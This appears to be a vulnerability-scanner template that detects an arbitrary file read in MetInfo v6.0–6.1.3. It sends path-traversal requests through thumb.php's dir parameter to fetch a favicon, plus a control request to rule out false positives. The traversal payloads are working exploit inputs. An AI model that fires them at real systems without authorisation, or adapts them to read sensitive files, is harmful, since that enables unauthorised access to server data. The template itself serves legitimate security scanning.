id: metinfo-include-thumb-read-any-file
info:
  name: MetInfo Arbitrary File Read Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  description: |
    MetInfo v6.0 - v6.1.3 contains an arbitrary file read vulnerability. Attackers can use the dir parameter in thumb.php to read arbitrary files on the server.

http:
  - raw:
      - |
        GET /include/thumb.php?dir=http/...././/...././/favicon.ico HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "^\\x00\\x00.*"
      - type: word
        part: header
        words:
          - "image"

  - raw:
      - |
        GET /include/thumb.php?dir=http/...././/...././/fav1c0n.ico HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "^\\x00\\x00.*"
        negative: true
      - type: word
        part: header
        words:
          - "image"
        negative: true

  - raw:
      - |
        GET /include/thumb.php?dir=http/..././..././favicon.ico HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "^\\x00\\x00.*"
      - type: word
        part: header
        words:
          - "image"
